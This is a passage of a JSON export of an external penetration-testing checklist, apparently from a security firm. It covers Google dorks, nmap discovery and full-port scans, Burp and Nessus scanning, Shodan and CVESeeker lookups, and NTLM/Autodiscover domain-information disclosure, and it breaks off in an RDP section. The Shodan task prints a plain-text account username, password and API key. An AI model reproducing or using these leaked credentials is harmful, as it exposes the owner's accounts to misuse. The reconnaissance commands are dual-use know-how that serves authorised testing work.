							"remediationInstructions": "<p>Ensure that passwords and other sensitive data are not accessible to unauthenticated internet users via publicly accessible clipboards.</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3b9ff2fe-d4ea-4f43-970f-cfbba283e7a9",
						"name": "Online Search Engines [ExPowerPen]",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": false,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063359,
							"uid": "2b0730cc-623e-e811-80fe-ecf4bbd04073",
							"name": "General Information - Search Engines",
							"description": "<p>A search engine has indexed company files or information found online.</p>",
							"severityId": -2,
							"businessImpact": "<p>Sensitive files and company information that isn't meant to be publicly accessible can inadvertently be published online and indexed by popular search engines such as Google, Bing, and Yahoo. Once indexed, attackers can use specialized search queries to hunt for this information and leverage it in further attacks.</p>",
							"sourceIdentifier": "M:b1f440f4-17dc-43e2-8866-2b9613f83f8b",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>Use Google dorks to search for company related files and information.</p><h2>Variation: Manual</h2><p>Search for internal sites, configuration information, and documentation:</p><pre><code>site:netspi.com &quot;internal&quot;\nsite:netspi.com &quot;confidential&quot;\nsite:netspi.com &quot;proprietary&quot;\nsite:netspi.com &quot;admin&quot;\nsite:netspi.com &quot;configuration&quot;</code></pre><p>Search for file types on company websites:</p><pre><code>site:netspi.com filetype:pdf\nsite:netspi.com filetype:xls\nsite:netspi.com filetype:xlsx\nsite:netspi.com filetype:ppt\nsite:netspi.com filetype:pptx\nsite:netspi.com filetype:doc\nsite:netspi.com filetype:docx\nsite:netspi.com filetype:config\nsite:netspi.com filetype:xml\nsite:netspi.com filetype:json\nsite:netspi.com filetype:yaml\nsite:netspi.com filetype:ini\nsite:netspi.com filetype:txt\nsite:netspi.com filetype:bak</code></pre><p>Review company site search results for interesting subdomains and content:</p><pre><code>site:netspi.com -&quot;www&quot; -&quot;thingtoremove&quot;</code></pre><p>Search for company references on  common help forums:</p><pre><code>site:bleepingcomputer.com netspi\nsite:stackoverflow.com netspi</code></pre><p>Search for company email footers to find email posting:</p><pre><code>netspi + &quot;email footer language here&quot;</code></pre><h3><strong>Reporting Requirements</strong></h3><p>Track URLs in task notes that have interesting information or confidential data. For exposed sensitive data, create a separate high severity finding.</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Remove all affected documents from the internet that contain sensitive data or non-public company information.</p>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 7,
				"collapsed": true
			},
			{
				"uid": "45bcf399-25d7-4fac-9eeb-ba5c4a5ea399",
				"name": "Information Gathering: Live Systems [ASM] ",
				"description": "<p>This goal of this task group is to identify live systems.</p>",
				"type": 1,
				"tasks": [
					{
						"uid": "56e93285-ac54-4ca6-a6c6-9a7ef3b950e4",
						"name": "EASM External Penetration Test Workflow",
						"instructions": "<h2>Instructions</h2><p>1. Navigate the \"Jobs\" tab in your project.</p><p>2. Click the \"Start Scan\" button in the middle of the screen.</p><p>3. In the pop-up window, add all IPs and domains in scope as a line separated list.</p><p>4. Data will continue to update as the scan runs. You can view data in ASM by clicking the \"View in ASM\" button in the upper right.</p><p>5. Review the data in the Assets and Exposures sections for interesting data and newly discovered assets requiring manual approval such as new root domains or IPs. If new root domains or IPs are discovered, determine if they are in-scope, if so, click the asset, then click the button \"Add to Monitoring\" to include in future scans.</p><p>6. Additional IPs and Domains you may discover through manual discovery can be added to the scan scope by clicking \"View in ASM\", clicking \"Assets\" in the left sidebar, clicking either Domains or IP Addresses tile cards, then clicking the \"+\" button in the upper right corner. Enter the additional assets in right hand pane. Use the \"Manual Discovery\" option for attribution if needed. Assets added while a scan is currently running will not be added to the scan. An additional scan will need to be run as detailed in the next step.</p><p>7. Once the first scan has completed, a second scan should be run to include any newly discovered data. Click the \"View in ASM\" button, click \"Operations\" in the left sidebar, click the ExPen operation, then click \"Run\" to start another scan.</p><p>8. Repeat as needed for additional data.</p><p>9. Once the scan has completed, export the live IP list from the Assets: IPs page for use in Nessus scan(s). Export the live domain list from Exposures: DNS for use in scans as well.</p><p>10. Findings should automatically sync to the workspace once the scan completes, but a manual sync can be triggered if needed by clicking the \"Sync to Workspace\" button in the upper right.</p><p>NOTE: Do NOT click the Scan Certificate Transparency Logs button! The results will automatically be added to ASM monitoring, which will cause ASM to scan out-of-scope hosts during future rounds.</p><p>After ASM completes scanning, make sure to check and see if any IP addresses timed out, and if there are newly discovered domains that should be scanned as well</p><ul><li><p>Domains that have not been port scanned: Assets &gt; Domain &gt; search bar: !_exists_:live</p></li><li><p>IPs that timed out port scanning: Assets &gt; IP &gt; search bar:&nbsp;portScanTimedOut:true</p></li></ul><h3>Reporting Requirements</h3><p>Ensure all data has been synced by clicking on the the \"Sync to Workspace\" button on the Jobs tab in Platform. Do a quick sanity check by spot-checking the Exposures -&gt; Vulnerabilities -&gt; All Vulnerabilities section in ASM against the Platform project workspace.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a4cf97bd-d556-4d6a-94e8-acdb0df81b3a",
						"name": "[ASM] Discovery Scanning - Ping",
						"instructions": "<h2>Instructions</h2><p>Perform discovery scanning using ping to help identify live systems.</p><p><strong>NOTE:</strong></p><p><strong><em>This task does not need to be performed if using ASM.</em></strong></p><p>If using ASM, scans will be performed as part of the ExPen workflow and output data will automatically be imported into Resolve. </p><p><strong><em>If ASM can't be used or is unavailable for any reason</em></strong>, then this step can be performed as instructed below. It is only required if the number of systems in scope is greater than 100. Nmap XML output can then be imported manually into the Resolve project's Sources tab.</p><h2><strong>Variation: Nmap</strong></h2><p>1. Run the ping scan using the nmap command below.</p><pre><code>nmap -sn -iL hosts -oA Client-Ping</code></pre><p><strong>Note:  </strong>This is not accurate in all environments.  In most cases you will have to conduct a TCP/UDP discovery port scan to get a reliable list of live systems.</p><h2><strong>Report Requirements</strong></h2><p>Import the Nmap XML output into the Sources page in Resolve.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "3c1063e5-87f1-4848-87b7-3d900be8b476",
						"name": "[ASM] Discovery Scanning - TCP",
						"instructions": "<h2>Instructions</h2><p>Perform discovery scanning to identify service on well known TCP ports. </p><p><strong>NOTE:</strong></p><p><strong><em>This task does not need to be performed if using ASM.</em></strong></p><p>If using ASM, scans will be performed as part of the ExPen workflow and output data will automatically be imported into Resolve. </p><p><strong><em>If ASM can't be used or is unavailable for any reason</em></strong>, then this step can be performed as instructed below. It is only required if the number of systems in scope is greater than 100. Nmap XML output can then be imported manually into the Resolve project's Sources tab.</p><h2><strong>Variation: Nmap</strong></h2><p>Perform discovery scanning to identify live systems.</p><p><strong>Note:</strong> This step is only required if the number of systems in scope is greater than 100. In most cases the commands below will be fine. However, in sensitive environments you may need to throttle the scans down to T3 or T2.</p><p>1. Run the TCP port discovery scan using the nmap command below.</p><pre><code>nmap -sS -Pn -n -T4 --min-hostgroup 128 --max-retries 0 -p21,22,23,25,53,79,80,81,110,139,143,443,445,465,514,993,1433,3306,1521,5432,2902,5800,5900,3389,8000,8300,8080,8500,8501,8433,8888,51010,9090,9100,10000 -iL hosts -oA Client-TCP-Disco</code></pre><h2><strong>Report Requirements</strong></h2><p>Import the Nmap XML output into the Sources page in Resolve.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8fab076e-795c-4935-8101-7ff57a508023",
						"name": "[ASM] Full Port Scan - TCP",
						"instructions": "<h2>Instructions</h2><p>Perform TCP port scanning against all ports.</p><p><strong>NOTE:</strong></p><p><strong><em>This task does not need to be performed if using ASM.</em></strong></p><p>If using ASM, scans will be performed as part of the ExPen workflow and output data will automatically be imported into Resolve. </p><p><strong><em>If ASM can't be used or is unavailable for any reason</em></strong>, then this step can be performed as instructed below. This should be executed after full port vulnerability scanning with the goal of obtaining more accurate fingerprinting. This should be executed as time allows. Nmap XML output can then be imported manually into the Resolve project's Sources tab.</p><h2><strong>Variation: Nmap</strong></h2><p><strong>Note: </strong>In most cases the commands below will be fine. However, in sensitive environments you may need to throttle the scans down to T3 or T2.</p><p>1. Run the scan.</p><pre><code>nmap -sS -sV -O -T4 -Pn -p- --min-hostgroup 128 --max-retries 0 -iL hosts -oA Client-TCP-Full</code></pre><h2>Report Requirements</h2><p>Import the Nmap XML output into the Sources page in Resolve.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f976d862-ea8d-4874-a9f0-b0e43349d20d",
						"name": "[ASM] Discovery Scanning - UDP",
						"instructions": "<h2>Instructions</h2><p>Perform UDP port scanning of common ports.  </p><p><strong>NOTE:</strong></p><p><strong><em>This task does not need to be performed if using ASM.</em></strong></p><p>If using ASM, scans will be performed as part of the ExPen workflow and output data will automatically be imported into Resolve. </p><p><strong><em>If ASM can't be used or is unavailable for any reason</em></strong>, then this step can be performed as instructed below. It is only required if the number of systems in scope is greater than 100. Nmap XML output can then be imported manually into the Resolve project's Sources tab.</p><h2><strong>Variation: Nmap</strong></h2><p><strong>Note: </strong>In most cases the commands below will be fine. However, in sensitive environments you may need to throttle the scans down to T3 or T2.</p><p>1. Run the UDP port scan using the nmap command below.</p><pre><code>nmap -sU -sV -T4 -Pn -p53,69,161,111,123,514 -iL hosts -oA Client-UDP</code></pre><h2><strong>Report Requirements</strong></h2><p>Import the Nmap XML output into the Sources page in Resolve.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "1a4e26fb-7535-4266-97c1-fae35799a62e",
						"name": "[ASM] Web Vulnerability Scanning - Burp",
						"instructions": "<h2>Instructions for ASM</h2><p>When executing the standard External Network Penetration Test Workflow in ASM, all IPs and domains supplied as part of the ASM scope will be scanned with Burp and findings will be imported into the workspace. This is, generally speaking, going to provide sufficient automated testing coverage. However, please review the ASM operation's Dynamic Web Vulnerability Scanning task for timeouts and/or failures. These can indicate that a Burp scan may need to be performed via a local Burp Pro installation due to the scan taking too long, or failing for some other reason. The interface will not tell you specifically which sites failed, so you may need to reach out to the ASM team for assistance.</p><h2>Instructions for Manual Scans</h2><p>If necessary due to ASM timeouts/failures, or due to sensitive apps that needed to be handled manually, perform one round of scanning for each identified web application/server. For both IP addresses and domains, target HTTP and HTTPS.</p><p><span style=\"color: red\"><strong>Refer to the \"Web Application Testing Guidance\" checklist item for BurpSuite configuration and checklist guidance when performing application testing on an ExPen.</strong></span></p><p>DO NOT target ISP domains. They will not yield additional results.</p><h2>Variation: Burp Suite Pro</h2><p>1. On the Target tab, navigate to Scope Settings and add all target URLs to Scope.</p><p>2. Under Out-of-scope request handling, check the box to drop all out-of-scope requests and use suite scope [defined above].</p><p>3. On the Dashboard tab, click New Scan.</p><p>4. Under scan configuration, select Fast.</p><p>5. When the scan has completed, navigate to the Target tab.</p><p>6. For each in-scope URL, select the findings, right-click and select \"Report selected issues\".</p><p>7. Select Export issue data (XML) and uncheck Base-64 encode requests and responses.</p><p>8. Press next until you are prompted for where to save the file. Name the file \"URL-date.xml\"</p><p>9. Import the XML file to Platform.</p><p>Important Note</p><p>Please do not perform authenticated scanning of web applications.&nbsp;Most of those web applications are production and simply crawling some of them can have unintended consequences.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b9ae516f-3b9a-4fc5-9df7-84fe9f7743b6",
						"name": "[ASM] Vulnerability Scanning - Nuclei",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 8,
				"collapsed": true
			},
			{
				"uid": "da9ae89a-5b4e-42bd-bb82-b5d58092b4dd",
				"name": "Vulnerability Enumeration: Automated Scanning",
				"description": "The goal of this task group is to identify vulnerabilities using automated scanners.",
				"type": 1,
				"tasks": [
					{
						"uid": "7f31db4a-a686-4c75-bdb6-372c52d96e4f",
						"name": "Live Assets for Testing",
						"instructions": "<p>Document the number of live assets identified for testing from discovery compared to the expected live asset count from the SOW.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5cccbf47-c5d9-4a7f-a041-8568ef984a2e",
						"name": "Vulnerability Scanning - Nessus (All Ports)",
						"instructions": "<h2>Instructions</h2><p>Please use the one of the following standard NetSPI ExPen profiles:</p><ol><li><p>NetSPI Standard - June2025 - ExPen - No Ping</p></li><li><p>NetSPI Standard - June2025 - ExPen - No Ping No Web</p></li></ol><p>Refer to the instructions at the bottom for a breakdown of Nessus settings if needed.</p><h2>Variation: Nessus Console</h2><p>1. Log into https://nessus.netspi.com or https://nessus2.netspi.com with your IT provided username and password.</p><p>Note: Admin password is stored in PasswordState</p><p>2. Create and run the scan using the \"NetSPI Standard - ExPen - No Ping\" scanning profile with the most recent date.</p><p>3. Name the scan using the standardized naming convention below.</p><pre><code>Company-Year-ProjectType-ID</code></pre><h3>Example:</h3><pre><code>NETSPI-2025-ExPen-1000001111</code></pre><p>Note: Please be aware that old scans will be deleted and it's up the consultant to download and save scans when needed.</p><p>4. Export results as .nessus file</p><p>5. Import the result into Platform</p><h3>Additional Notes</h3><p>Below are the is the Custom Nessus configuration if a new profile needs to be created on the fly or communicated to a client:</p><pre><code>Discovery Settings:\n    Host Discovery: \n        Change \"Ping remote host\" to \"Off\" for standard ExPen projects\n        Under \"Fragile Devices\", include \"Scan network printers\" and \"Scan Novell Netware hosts\"\n    Port Scanning:\n        Scan all ports (1-65535), will need to change the value from \"default\" to 1-65535\n        Uncheck \"Only run network port scanners if local port enumeration failed\"\nAdvanced Settings:\n    Performance Options:\n        Check \"Slow down the scan if network congestion is detected\"\n        Change \"Max simultaneous hosts per scan\" to 50\n        5 simultaneous checks per host (default)\n        5 second network timeout (default)\nPlugins:\n    For unauthenticated scanning, remove all \"Local\" check plugins from the scan (e.g. AIX Local Security Checks, Alibaba Cloud Linux Local Security Checks, etc.). These should disable by default if credentials are not provided but good to remove them.\n\n[FOR WEB SCANNING]\nAssessment Settings:\n    Web Applications:\n        Set scan web applications to \"On\"\n[More testing required to enable more web scanning options]</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "aea31347-3c3d-41be-8316-ddd92068ad2e",
						"name": "Passive Scanning - Shodan",
						"instructions": "<h2>Instructions</h2><p>Review Shodan results for potential vulnerabilities.</p><h2>Variation: CVESeeker</h2><p>CVESeeker works similarly to smap, however it also pulls down relevant PoC URLs found on GitHub based on the CVEs that smap identifies for a particular target/port. This tool usually works as a good sanity check against what you are seeing come back from ASM and/or Nessus, and may provide insight into additional services to dig into.</p><p><strong>NOTE: DO NOT use PoCs identified by the tool unless they've been thoroughly reviewed and are considered safe to run against client systems. If unsure, please reach out to a service or POD lead for assistance with evaluating the PoC.</strong></p><p>1. Download the latest release and install.</p><pre><code>git clone https://github.com/anmolksachan/CVESeeker &amp;&amp; cd CVESeeker\npip3 install -r requirements.txt\npip install colorama</code></pre><p>2. Run the tool.</p><h3>Example:</h3><pre><code><strong>$ python3 cveSeeker.py --file targets.txt --project testProject\n[TRUNCATED]</strong>\n                            Unveiling Cyber Threats: From assets to Vulnerability Insights\n                                     Coded with Love by Anmol K Sachan @FR13ND0x7F\n\n-------------Stats-------------\n[+] Domains Found: 1\n[+] IP Found: 0\n[+] Alive domains: 1\n[+] Not reachable: 0\n[+] Total IP: 1\n[+] Duplicates: 0\n[+] Unique: 1\n-------------------------------\n\n[+] Looking for CVEs\n<span style=\"color: rgb(219, 39, 25)\"><strong>[+] 45.33.32.156(scanme.nmap.org) (Open Ports): 22, 80, 123, 31337</strong></span>\n[+] 45.33.32.156(scanme.nmap.org) (Vulnerabilities): CVE-2018-1302, CVE-2014-8109, CVE-2020-13938, CVE-2013-4365, CVE-2016-0736, CVE-2022-36760, CVE-2021-39275, CVE-2013-5704, CVE-2020-1927, CVE-2022-23943, CVE-2022-29404, CVE-2016-2161, CVE-2019-10092, CVE-2019-0217, CVE-2013-0941, CVE-2022-28615, CVE-2021-26691, CVE-2014-0117, CVE-2015-3183, CVE-2012-4001, CVE-2018-1303, CVE-2022-28330, CVE-2006-20001, CVE-2017-15710, CVE-2019-0220, CVE-2017-15715, CVE-2023-45802, CVE-2013-2765, CVE-2022-22719, CVE-2014-3523, CVE-2015-3185, CVE-2022-28614, CVE-2022-22721, CVE-2014-0118, CVE-2021-32786, CVE-2012-3526, CVE-2018-1301, CVE-2022-37436, CVE-2014-0226, CVE-2012-4360, CVE-2009-0796, CVE-2016-8612, CVE-2007-4723, CVE-2022-22720, CVE-2016-8743, CVE-2021-32785, CVE-2014-0231, CVE-2011-2688, CVE-2021-44224, CVE-2022-30556, CVE-2021-34798, CVE-2014-3581, CVE-2020-35452, CVE-2021-44790, CVE-2021-32791, CVE-2013-0942, CVE-2017-9798, CVE-2019-10098, CVE-2013-6438, CVE-2017-7679, CVE-2021-32792, CVE-2017-9788, CVE-2016-5387, CVE-2014-0098, CVE-2018-1283, CVE-2020-11985, CVE-2022-26377, CVE-2018-1312, CVE-2018-17199, CVE-2011-1176, CVE-2023-31122, CVE-2015-3184, CVE-2015-0228, CVE-2023-25690, CVE-2022-31813, CVE-2019-17567, CVE-2021-26690, CVE-2020-1934, CVE-2016-4975, CVE-2009-2299, CVE-2017-3167, CVE-2021-40438\n<span style=\"color: rgb(219, 39, 25)\"><strong> [+] Fetching POCs for CVEs (Total Number of CVEs identified: 82)\n  [+] POC for CVE-2019-10092 Found:\n    https://github.com/mbadanoiu/CVE-2019-10092\n    https://github.com/motikan2010/CVE-2019-10092_Docker\n  [+] POC for CVE-2006-20001 Found:\n    https://github.com/Saksham2002/CVE-2006-20001\n</strong></span><strong>[TRUNCATED]</strong></code></pre><h2>Variation: smap</h2><p>1. Download the latest release, or download the source and build with go.</p><pre><code>go install -v github.com/s0md3v/smap/cmd/smap@latest</code></pre><p>OR</p><pre><code>git clone https://github.com/s0md3v/Smap.git\ncd Smap/cmd/smap\ngo build</code></pre><p>2. Run the tool.Example:</p><pre><code>./smap -oS - scanme.nmap.org\n\n        Smap (0.1.0-rc)\n\n+ 45.33.32.156 (scanme.nmap.org, scanme.nmap.org)\n  - OS: MiniBSD\n  - Tags: cloud\n  + Ports:\n    - 80 tcp/http cpe:/a:apache:http_server:2.4.7\n    - 22 tcp/ssh?\n    - 123 tcp/ntp?\n  - Vulns: CVE-2018-1312, CVE-2015-3185, CVE-2016-0736, CVE-2014-0231, CVE-2017-7679, CVE-2019-0220, CVE-2014-8109, CVE-2018-1283, CVE-2017-15715, CVE-2016-8612, CVE-2016-2161, CVE-2014-3523, CVE-2014-0118, CVE-2014-0226, CVE-2018-17199, CVE-2014-0117, CVE-2017-15710, CVE-2015-3184, CVE-2017-9798, CVE-2013-6438, CVE-2016-4975, CVE-2014-0098, CVE-2017-9788, CVE-2016-8743</code></pre><h2>Variation: Manual</h2><p>1. Log into shodan.io</p><pre><code>https://account.shodan.io/</code></pre><p>Web Login:</p><pre><code>User: ipsten\nPass: tCi6VdPE5p1QyGBTfNkMzIy0qoon89qqZrLwYk</code></pre><p>API Key (for any tools that could use it):</p><pre><code>TsAUQ1SFV04sjSQIjD2ympPfF0jLe2Sz</code></pre><p>2. Attempt to identify useful information for in scope IP addresses. Consider searching by IP, IP range, and company name.  Below are some examples.</p><ul><li><p>org:\"comcast\"</p></li><li><p>org:\"comcast\" city:minneapolis</p></li><li><p>net:206.209.112.0/24</p></li><li><p>port:443</p></li><li><p>product:\"SonicWALL firewall http config\" port:\"443\"</p></li><li><p>Apache city:\"San Francisco\" port:\"8080\" product:\"Apache Tomcat/Coyote JSP engine\"</p></li><li><p>ameriprise org:\"Amazon.com\"</p></li></ul><h3><strong>Report Verification</strong></h3><p>Include copies of relevant data in the task notes and be sure to create findings for identified vulnerable versions.  You may also be able to recover subdomains for targeting. Also, watch for the use of AWS and Azure.</p><h3>More Notes</h3><p><strong>Note:</strong> Ryan K is working on  a database and api.Link to information finding - users exposed in breach data. We need to add a finding to the \"Vulnerability Enumeration: Manual Findings\" category:</p><ul><li><p>Run shodan dump to get basic service information</p></li></ul><p>Common use cases for data</p><ul><li><p>determine if we are being blocked by ips</p></li><li><p>choose systems for sampled testing after discovery scanning / dump</p></li><li><p>identify potential vulnerabilities</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "9f1388f7-b75e-452d-bf80-802e7b9d9aac",
						"name": "Verify Scan Data is Imported Correctly",
						"instructions": "<h2>Instructions</h2><p>Review automated scan data for anomalies.</p><h2>ASM</h2><p>1. Verify that the ASM workflow data (nmap/Burp/Nuclei) was imported correctly when the scan is complete.</p><p>2. Review the Sources tab and sanity check what was imported. Are any obvious scan types missing? Are any obvious websites missing that Burp should have scanned?</p><p>3. If any of the expected scan data is missing, raise the concern in the #services or #dev-questions Slack channels to get assistance.</p><h2>Nessus</h2><p>1. Review the sources tab to verify the Nessus data was imported correctly.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "012c799e-1430-4d5f-bc6d-3302de364233",
						"name": "Open Port Re-check",
						"instructions": "<p>The finding for \"Open port re-check\" or \"A port was found open at the beginning of the scan and is now closed\" has a severity override to Urgent on ExPen projects, as this is a strong indicator that IPS systems or similar could be interfering with results from automated testing.</p><p>If this finding is presented in your workspace, review the number of instances. If it is a material percentage of the scope, reconfirm with the client that IPS exceptions are in place. If you are unsure, escalate to your manager or a service line lead.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 9,
				"collapsed": true
			},
			{
				"uid": "0a0c8188-b55d-48c4-866a-1f5bd2da6d6a",
				"name": "Information Gathering: AD Domains",
				"description": "<p>The goal of this task group is to identify Active Directory domains.  This helps  increase the success rate of future dictionary attacks and OSINT tasks.</p>",
				"type": 1,
				"tasks": [
					{
						"uid": "ada79b84-2d09-449c-b83a-6d8701695a35",
						"name": "Information Disclosure - ADS Domain - NTLM Supported",
						"instructions": "<h2><strong>Instructions</strong></h2><p>1. Identify interfaces that support NTLM.</p><p>2. Send authenticated request.</p><p>3. Parse information from the response.</p><p>4. If its possible to leak information, add the associated finding, and add verification that has the command and output.</p><h2><strong>For direct protocol access check use:</strong></h2><p>Tool: <strong>Nmap</strong></p><p>Run the following nmap scripts to identify domain information:</p><p>Note: Grab targets from informational findings based on the protocol.</p><p>For example make sure to target all web servers listed under the finding \"HTTP - Service Uses Protocol\".</p><pre><code>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP\nnmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL\nnmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM\nnmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM\nnmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM\nnmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM\nnmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM</code></pre><p><strong>AIO:</strong></p><pre><code>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP &amp;&amp; nmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL &amp;&amp; nmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM &amp;&amp; nmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM &amp;&amp; nmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM &amp;&amp; nmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM &amp;&amp; nmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM</code></pre><h2><strong>Variation: Specific URLs -- NTLM_Challenger Tool</strong></h2><p>Tool: NTLM Challengers</p><p>Source: https://github.com/nopfor/ntlm_challenger</p><h3>Example:</h3><pre><code><strong>python3 ntlm_challenger.py 'https://autodiscover.hackin.club/autodiscover/autodiscover.xml'\n\nTarget (Domain): HACKIN\n\nVersion: Server 2012 / Windows 8 (build 9200)\n\nTargetInfo:\nMsvAvNbDomainName: HACKIN\nMsvAvNbComputerName: EXCH01\nMsvAvDnsDomainName: hackin.club\nMsvAvDnsComputerName: EXCH01.hackin.club\nMsvAvDnsTreeName: hackin.club\nMsvAvTimestamp: Nov 3, 2019 01:07:16.573170\n\nNegotiate Flags:\nNTLMSSP_NEGOTIATE_UNICODE\nNTLMSSP_REQUEST_TARGET\nNTLMSSP_NEGOTIATE_ALWAYS_SIGN\nNTLMSSP_TARGET_TYPE_DOMAIN\nNTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY\nNTLMSSP_NEGOTIATE_TARGET_INFO\nNTLMSSP_NEGOTIATE_VERSION</strong></code></pre><h2><strong>For Autodiscover:</strong></h2><p>Identify internal, managed, and federated active directory domains.</p><p>The Autodiscover service minimizes user configuration and deployment steps by providing clients access to Exchange features. For Exchange Web Services (EWS) clients, Autodiscover is typically used to find the EWS endpoint URL. However, Autodiscover can also provide information to configure clients that use other protocols. Autodiscover works for client applications that are inside or outside firewalls and in resource forest and multiple forest scenarios.</p><p>As part of this service, an RPC over HTTP (\"Outlook Anywhere\") feature can be configured, resulting in the presence of the https://autodiscover.domain.com/rpc URL.  RPC over HTTP, also known as Outlook Anywhere, is a legacy method of connectivity and transport between Outlook for Windows and Exchange. In May 2014, Microsoft introduced MAPI over HTTP as a replacement for RPC over HTTP.</p><p>Starting on October 31, 2017, RPC over HTTP will no longer be a supported protocol for accessing mail data from Exchange Online. However, organizations may still support this feature depending on their Exchange configuration.</p><h2><strong>Variation: Manual Process using Burp</strong></h2><p>1. Start Burp and proxy your browser traffic through it.</p><p>2. For each domain enumerated in scope attempt to access the autodiscover subdomain's RPC URL to identify potential Active Directory domains.</p><h3>Example:</h3><pre><code>https://autodiscover.domain.com/rpc</code></pre><p>3. When prompted for credentials by the website, enter any username/password combination (invalid credentials are fine).</p><p>4. Copy the value (bold portion below) from the WWW-Authenticate header that is returned by the server.</p><h3>Example:</h3><pre><code>WWW-Authenticate: NTLM <strong>TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=</strong></code></pre><p>5. Base64-decode the value and review it for internal domain names. Note that not all characters will be printable:</p><h3>Example:</h3><pre><code><strong># echo \"TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=\" | base64 -d</strong>\nNTLMSSP8\n98AMSAMSW0095AP20\"<strong>subdomain.domain.com</strong>6W0095AP20.subdomain.domain.comdomain.com</code></pre><h2><strong>RDP (Only in restricted Admin mode)</strong></h2><p>Below are some common tools that can be 